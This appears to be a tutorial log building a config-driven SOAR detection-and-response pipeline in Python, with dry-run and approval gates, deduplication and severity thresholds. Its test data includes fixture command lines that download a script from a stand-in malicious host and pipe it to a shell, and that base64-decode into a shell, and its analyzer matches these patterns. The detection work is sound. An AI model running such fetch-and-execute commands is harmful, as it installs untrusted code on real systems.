# Week 5 Day 6 - Full Pipeline Integration and Hardening

This day consolidates the full SOAR flow into one hardened, config-driven pipeline design.

## Day Objective

Today I combined every stage into one clean, maintainable pipeline path:

Detection -> Enrichment -> Case Creation -> Routing -> Response -> Logs

The practical goals were:

- Centralize runtime policy in a config module
- Keep execution behavior safe and deterministic
- Gate response behavior by severity and approval
- Add deduplication for repeated events
- Filter low-signal events by severity threshold
- Produce auditable artifacts and summary metrics

## Folder Setup (Reference)

From week5/day6, copy forward these files from Day 5:

- analyzer.py
- enrichment.py
- response.py
- case.py
- router.py
- responder.py
- test_data.json

Then add:

- config.py
- pipeline.py

## File: config.py

```python
DRY_RUN = True

MINIMUM_CASE_SEVERITY = "medium"

SEVERITY_ORDER = {
    "informational": 0,
    "low": 1,
    "medium": 2,
    "high": 3,
    "critical": 4
}

PROTECTED_PROCESSES = [
    "systemd",
    "init"
]

SYSTEM_PARENTS = ["0", "1", "2"]

SYSTEM_PROCESS_PREFIXES = [
    "kworker",
    "rcu_",
    "migration",
    "ksoftirqd",
    "watchdog",
    "idle_inject",
]

EXECUTED_BY = "soar_engine"

PLAYBOOK_STAGE = "full_pipeline_integration"
```

## File: responder.py (Replace)

```python
import json
from datetime import datetime, timezone

from config import DRY_RUN, EXECUTED_BY, PROTECTED_PROCESSES


def current_time():
    return datetime.now(timezone.utc).isoformat()


def write_log(filename, action_data):
    with open(filename, "a", encoding="utf-8") as file:
        file.write(json.dumps(action_data) + "\n")


def log_action(action_data):
    if action_data.get("executed"):
        write_log("success.log", action_data)
    else:
        write_log("failed.log", action_data)


def safety_check(case):
    severity = case.get("severity")
    process = case.get("evidence", {}).get("process")

    if severity == "informational":
        return False, "Informational severity - no action allowed"

    if process in PROTECTED_PROCESSES:
        return False, "Protected system process"

    return True, "Safe to proceed"


def build_command(action, case):
    pid = case.get("evidence", {}).get("pid", "unknown")

    if action == "isolate_host":
        return "SIMULATED: isolate-host --target current_host"

    if action == "collect_context":
        return f"SIMULATED: collect-context --pid {pid}"

    if action == "kill_process":
        return f"SIMULATED: kill -9 {pid}"

    return "SIMULATED: no command generated"


def execute_response(case):
    severity = case.get("severity")
    action = case.get("recommended_response", {}).get("action")
    approved = case.get("approved", False)

    allowed, safety_reason = safety_check(case)

    base_result = {
        "timestamp": current_time(),
        "case_id": case.get("case_id"),
        "severity": severity,
        "executed_by": EXECUTED_BY,
        "dry_run": DRY_RUN
    }

    if not allowed:
        result = {
            **base_result,
            "executed": False,
            "reason": safety_reason,
            "command": None
        }
        log_action(result)
        return result

    if severity == "critical" and not approved:
        result = {
            **base_result,
            "executed": False,
            "reason": "Awaiting approval for critical response",
            "command": None
        }
        log_action(result)
        return result

    if severity == "critical":
        response_action = "isolate_host"
    elif action == "collect_more_context":
        response_action = "collect_context"
    else:
        result = {
            **base_result,
            "executed": False,
            "reason": "No execution rule matched",
            "command": None
        }
        log_action(result)
        return result

    command = build_command(response_action, case)

    result = {
        **base_result,
        "executed": True,
        "action": response_action,
        "mode": "dry_run" if DRY_RUN else "live",
        "command": command,
        "message": "DRY RUN: Command was not executed; only simulated."
        if DRY_RUN else
        "LIVE MODE: Command would execute here."
    }

    log_action(result)
    return result
```

## File: analyzer.py (Replace)

```python
import hashlib

from enrichment import enrich_process
from response import determine_severity, recommend_action
from case import create_case, update_case_status
from router import route_case
from responder import execute_response

from config import (
    SYSTEM_PARENTS,
    SYSTEM_PROCESS_PREFIXES,
    PLAYBOOK_STAGE
)


def is_known_system_process(proc):
    name = proc.get("name", "")
    parent = proc.get("parent", "")

    if name in ["systemd", "init"]:
        return True

    if parent in SYSTEM_PARENTS:
        return True

    if any(name.startswith(prefix) for prefix in SYSTEM_PROCESS_PREFIXES):
        return True

    return False


def analyze_behavior(proc):
    if is_known_system_process(proc):
        return 0, ["Known system/kernel process"]

    score = 0
    reasons = []

    path = proc.get("path", "")
    parent = proc.get("parent", "")
    cmdline = proc.get("cmdline", "")

    if path.startswith("/tmp") or path.startswith("/dev/shm"):
        score += 2
        reasons.append("Execution from temp directory")

    if parent not in ["bash", "systemd", "init"]:
        score += 2
        reasons.append(f"Contextually unusual parent process: {parent}")

    if ("curl" in cmdline or "wget" in cmdline) and "|" in cmdline:
        score += 3
        reasons.append("Download + pipe execution")

    if "base64" in cmdline and ("-d" in cmdline or "--decode" in cmdline):
        score += 2
        reasons.append("Base64 decode behavior in command line")

    return score, reasons


def apply_enrichment_score(score, reasons, enrichment):
    vt_result = enrichment.get("virustotal")

    if not vt_result:
        return score, reasons

    reputation = vt_result.get("reputation")

    if reputation == "malicious":
        score += 4
        reasons.append("Domain flagged as malicious by VirusTotal")

    elif reputation == "suspicious":
        score += 2
        reasons.append("Domain flagged as suspicious by VirusTotal")

    return score, reasons


def get_verdict(score):
    if score >= 5:
        return "malicious"
    if score > 0:
        return "suspicious"
    return "benign"


def get_confidence(score):
    if score >= 10:
        return "high"
    if score >= 5:
        return "medium"
    if score > 0:
        return "low"
    return "none"


def generate_dedupe_key(proc):
    raw = f"{proc.get('name', '')}|{proc.get('parent', '')}|{proc.get('cmdline', '')}"
    return hashlib.sha256(raw.encode("utf-8")).hexdigest()


def analyze_process(proc):
    score, reasons = analyze_behavior(proc)
    enrichment = enrich_process(proc)

    score, reasons = apply_enrichment_score(score, reasons, enrichment)

    verdict = get_verdict(score)
    severity = determine_severity(score, enrichment)
    confidence = get_confidence(score)
    response = recommend_action(verdict, severity, reasons, enrichment)

    analysis_result = {
        "process": proc.get("name", "unknown"),
        "pid": proc.get("pid", "unknown"),
        "path": proc.get("path", ""),
        "parent": proc.get("parent", ""),
        "cmdline": proc.get("cmdline", ""),
        "score": score,
        "severity": severity,
        "confidence": confidence,
        "verdict": verdict,
        "reasons": reasons,
        "enrichment": enrichment,
        "recommended_response": response,
        "playbook_stage": PLAYBOOK_STAGE
    }

    case = create_case(analysis_result)

    case["approved"] = proc.get("approved", False)
    case["routing"] = route_case(case)

    if severity in ["critical", "high", "medium"]:
        case = update_case_status(
            case,
            "in_progress",
            "Case accepted by assigned queue for investigation"
        )

    case["execution"] = execute_response(case)

    return case
```

## File: pipeline.py (New Main Runner)

```python
import json
from datetime import datetime, timezone

from analyzer import analyze_process, generate_dedupe_key
from config import MINIMUM_CASE_SEVERITY, SEVERITY_ORDER


def current_time():
    return datetime.now(timezone.utc).isoformat()


def load_processes(filename):
    with open(filename, "r", encoding="utf-8") as file:
        processes = json.load(file)

    if isinstance(processes, dict):
        processes = [processes]

    return processes


def should_create_case(case):
    severity = case.get("severity", "informational")
    verdict = case.get("verdict", "benign")

    if verdict == "benign":
        return False

    return SEVERITY_ORDER[severity] >= SEVERITY_ORDER[MINIMUM_CASE_SEVERITY]


def write_alert_log(case):
    alert = {
        "timestamp": current_time(),
        "case_id": case["case_id"],
        "severity": case["severity"],
        "confidence": case["confidence"],
        "verdict": case["verdict"],
        "process": case["evidence"]["process"],
        "pid": case["evidence"]["pid"],
        "cmdline": case["evidence"]["cmdline"],
        "queue": case["routing"]["queue"],
        "priority": case["routing"]["priority"],
        "assigned_to": case["routing"]["assigned_to"]
    }

    with open("alerts.log", "a", encoding="utf-8") as file:
        file.write(json.dumps(alert) + "\n")


def write_pipeline_summary(summary):
    with open("pipeline_summary.json", "w", encoding="utf-8") as file:
        json.dump(summary, file, indent=2)


def clear_output_files():
    for filename in [
        "cases.json",
        "alerts.log",
        "success.log",
        "failed.log",
        "pipeline_summary.json"
    ]:
        open(filename, "w", encoding="utf-8").close()


def main():
    clear_output_files()

    processes = load_processes("test_data.json")

    seen = set()
    cases = []

    summary = {
        "run_started": current_time(),
        "events_seen": 0,
        "duplicates_skipped": 0,
        "cases_created": 0,
        "benign_skipped": 0,
        "below_threshold_skipped": 0,
        "response_success": 0,
        "response_failed": 0
    }

    for proc in processes:
        summary["events_seen"] += 1

        dedupe_key = generate_dedupe_key(proc)

        if dedupe_key in seen:
            summary["duplicates_skipped"] += 1
            print(f"Duplicate skipped: {proc.get('cmdline', '')}")
            continue

        seen.add(dedupe_key)

        case = analyze_process(proc)

        if case.get("verdict") == "benign":
            summary["benign_skipped"] += 1
            print(f"Benign skipped: {proc.get('name')}")
            continue

        if not should_create_case(case):
            summary["below_threshold_skipped"] += 1
            print(f"Below threshold skipped: {proc.get('name')}")
            continue

        cases.append(case)
        write_alert_log(case)

        if case.get("execution", {}).get("executed"):
            summary["response_success"] += 1
        else:
            summary["response_failed"] += 1

    summary["cases_created"] = len(cases)
    summary["run_finished"] = current_time()

    with open("cases.json", "w", encoding="utf-8") as file:
        json.dump(cases, file, indent=2)

    write_pipeline_summary(summary)

    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
```

## Test Data for Day 6

```json
[
  {
    "name": "systemd",
    "pid": "1",
    "path": "",
    "parent": "0",
    "cmdline": "/sbin/init"
  },
  {
    "name": "bash",
    "pid": "4444",
    "path": "/tmp/.x",
    "parent": "apache2",
    "approved": false,
    "cmdline": "bash -c curl http://malicious-example.com/payload.sh | sh"
  },
  {
    "name": "bash",
    "pid": "4444",
    "path": "/tmp/.x",
    "parent": "apache2",
    "approved": false,
    "cmdline": "bash -c curl http://malicious-example.com/payload.sh | sh"
  },
  {
    "name": "bash",
    "pid": "5555",
    "path": "/dev/shm/.cache",
    "parent": "apache2",
    "cmdline": "bash -c echo ZWNobyB0ZXN0 | base64 -d | sh"
  }
]
```

## Run Instructions

Important: run pipeline.py, not analyzer.py.

```bash
python3 pipeline.py
```

Expected summary baseline:

```json
{
  "events_seen": 4,
  "duplicates_skipped": 1,
  "cases_created": 2,
  "benign_skipped": 1,
  "response_success": 1,
  "response_failed": 1
}
```

Then inspect outputs:

```bash
cat pipeline_summary.json
cat cases.json
cat alerts.log
cat success.log
cat failed.log
```

## Day 6 Exercises

### Exercise 1

Set in config.py:

```python
MINIMUM_CASE_SEVERITY = "high"
```

Rerun pipeline.py.

Expected:

- Medium base64 case skipped
- Critical case still created

### Exercise 2

Approve the critical event in test_data.json:

```json
"approved": true
```

Rerun pipeline.py.

Expected:

- Critical execution moves from failed.log to success.log

### Exercise 3

Add low-severity event:

```json
{
  "name": "bash",
  "pid": "6666",
  "path": "/usr/bin/bash",
  "parent": "cron",
  "cmdline": "bash -c echo hello"
}
```

Expected:

- With medium threshold, low-severity event is skipped below threshold

## Validation Notes (Observed)

The observed behavior matched expected hardening goals:

- Baseline run with medium threshold: 2 cases, 1 success, 1 failed execution (approval gate)
- High threshold run: medium case filtered below threshold
- Approval-enabled critical run: critical execution moved into success
- Additional low/noise event: threshold filtering increased below-threshold skips

## Day 6 Completion Criteria

- [x] config.py added
- [x] pipeline.py added
- [x] analyzer.py refactored
- [x] responder.py uses config
- [x] Summary output generated
- [x] Cases created only above threshold
- [x] Benign events skipped
- [x] Duplicates skipped
- [x] Response success/failure counted

Day 6 is complete when pipeline_summary.json accurately reflects each test run.

## Key Takeaway

This is no longer isolated playbook logic. It is an end-to-end SOC decision pipeline with policy-driven execution controls, deduplication, thresholding, approval gates, and auditable outcomes.
